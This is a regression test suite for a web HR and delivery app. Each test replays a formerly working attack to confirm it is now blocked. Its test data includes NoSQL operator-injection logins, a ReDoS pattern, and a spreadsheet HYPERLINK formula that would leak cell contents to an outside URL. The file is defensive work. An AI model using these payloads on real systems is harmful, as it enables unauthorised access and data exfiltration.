import { describe, it, expect, beforeAll } from "vitest";

/**
 * Regression tests for the findings of the internal security review
 * (docs/SECURITY.md § "Internal review"). Each test is an attack that
 * used to work.
 */
const tenantScope = require("../services/tenantScope");
const fake = require("../test/fakeMongo");
const express = require("express");
const request = require("supertest");
const jwt = require("jsonwebtoken");

process.env.JWT_SECRET = "security-fixes-secret-at-least-32-chars";
const User = require("../models/User");
const Employee = require("../models/Employee");
const { rejectOperators } = require("../middleware/rejectOperators");
const { neutralizeFormula } = require("../utils/csvHelpers");

let app;
let demo;
const tok = {};
const h = (w) => ({ Authorization: `Bearer ${tok[w]}` });
const sys = (fn) => tenantScope.runAsSystem(fn);

beforeAll(async () => {
  fake.connect();
  app = express();
  app.use(express.json());
  app.use((req, res, next) => tenantScope.bindRequest(req, tenantScope.SYSTEM, next));
  app.use(rejectOperators);
  app.use("/api/auth", require("./auth"));
  app.use("/api/users", require("./users"));
  app.use("/api/employees", require("./employees"));
  app.use("/api/field", require("./field"));
  demo = await sys(() => require("../scripts/seedSanity").seedSanityClient({ log: () => {} }));
  for (const k of ["admin", "hr", "driver", "logistics"]) tok[k] = jwt.sign({ id: String(demo.users[k]._id) }, process.env.JWT_SECRET);
}, 120000);

describe("operator injection", () => {
  it("login with { $regex } / { $ne } instead of an e-mail is refused", async () => {
    await request(app).post("/api/auth/login").send({ email: { $regex: "^a" }, password: "Admin@123" }).expect(400);
    await request(app).post("/api/auth/login").send({ email: { $ne: null }, password: "x" }).expect(400);
    await request(app).get("/api/users?search[$ne]=x").set(h("admin")).expect(400);
  });

  it("a search typed with regex syntax is matched literally (no ReDoS)", async () => {
    const r = await request(app).get("/api/users?search=(a%2B)%2B%24").set(h("admin"));
    expect(r.status).toBe(200);
  });
});

describe("HR self-promotion", () => {
  it("an HR officer cannot make themselves (or anyone) HR director", async () => {
    // Fatima (hr) is HR director in the demo: use a fresh HR officer.
    const officer = await sys(async () => {
      const e = await Employee.create({ company: demo.company._id, employeeNumber: "EMP-099", firstName: "Nora", lastName: "Officer", jobTitle: "Chargé RH", hireDate: new Date(), employmentStatus: "active", gender: "female" });
      return User.create({ firstName: "Nora", lastName: "Officer", email: "nora@sanity.test", password: "Nora@12345", role: "user", department: "hr", hrRole: "hr_officer", tenant: demo.tenant._id, employee: e._id });
    });
    const t = { Authorization: `Bearer ${jwt.sign({ id: String(officer._id) }, process.env.JWT_SECRET)}` };
    const self = await request(app).put(`/api/employees/${officer.employee}`).set(t).send({ jobTitle: "Directeur RH" });
    expect(self.status).toBe(403);
    const someone = await sys(() => Employee.findOne({ company: demo.company._id, employeeNumber: "EMP-008" }));
    const other = await request(app).put(`/api/employees/${someone._id}`).set(t).send({ jobTitle: "Directeur RH" });
    expect(other.status).toBe(403);
    expect((await sys(() => User.findById(officer._id).lean())).hrRole).toBe("hr_officer");
  });
});

describe("owner role", () => {
  it("an admin cannot make anyone owner", async () => {
    const target = demo.users.adv;
    const r = await request(app).put(`/api/users/${target._id}`).set(h("admin")).send({ firstName: "Sara", lastName: "ADV", email: "adv@sanity.test", role: "owner" });
    expect(r.status).toBe(403);
  });
});

describe("sessions after a password change", () => {
  it("the old token stops working; the response carries a new one", async () => {
    const u = await sys(() => User.create({ firstName: "Pw", lastName: "Change", email: "pw@sanity.test", password: "Old@123456", role: "admin", tenant: demo.tenant._id }));
    const login = await request(app).post("/api/auth/login").send({ email: "PW@sanity.test", password: "Old@123456" }).expect(200);
    const oldTok = login.body.data.token;
    await request(app).get("/api/users/me").set({ Authorization: `Bearer ${oldTok}` }).expect(200);
    const r = await request(app).put(`/api/users/${u._id}/password`).set({ Authorization: `Bearer ${oldTok}` }).send({ currentPassword: "Old@123456", newPassword: "New@123456" }).expect(200);
    await request(app).get("/api/users/me").set({ Authorization: `Bearer ${oldTok}` }).expect(401);
    await request(app).get("/api/users/me").set({ Authorization: `Bearer ${r.body.token}` }).expect(200);
  });
});

describe("proof of delivery", () => {
  it("a driver cannot sign off a delivery that is not on their round", async () => {
    const DeliveryNote = require("../models/DeliveryNote");
    // Any delivery note of the company, taken off its round.
    const note = await sys(async () => {
      const n = await DeliveryNote.findOne({ company: demo.company._id }).lean();
      await DeliveryNote.updateOne({ _id: n._id }, { $set: { round: null, status: "validated", proof: null } });
      return n;
    });
    expect(note).toBeTruthy();
    const sig = `data:image/png;base64,${Buffer.from("x").toString("base64")}`;
    const r = await request(app).post(`/api/field/deliveries/${note._id}/proof`).set(h("driver")).send({ signature: sig, receivedBy: "X" });
    expect(r.status).toBe(403);
  });
});

describe("exports", () => {
  it("spreadsheet formulas typed into names are neutralised, numbers are not", () => {
    expect(neutralizeFormula('=HYPERLINK("https://x/?"&C2,"Voir")')).toMatch(/^'=/);
    expect(neutralizeFormula("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(neutralizeFormula("-120.00")).toBe("-120.00");
    expect(neutralizeFormula(-5)).toBe(-5);
  });
});

describe("public document links", () => {
  it("no built-in signing key: without secrets, links can be neither made nor checked", () => {
    const saved = { j: process.env.JWT_SECRET, p: process.env.PUBLIC_LINK_SECRET };
    delete process.env.JWT_SECRET;
    delete process.env.PUBLIC_LINK_SECRET;
    const links = require("../services/publicLinks");
    const fn = links.sign || links.signDocToken || Object.values(links).find((f) => typeof f === "function");
    expect(() => fn({ k: "inv", id: "x" })).toThrow();
    process.env.JWT_SECRET = saved.j;
    if (saved.p) process.env.PUBLIC_LINK_SECRET = saved.p;
  });
});
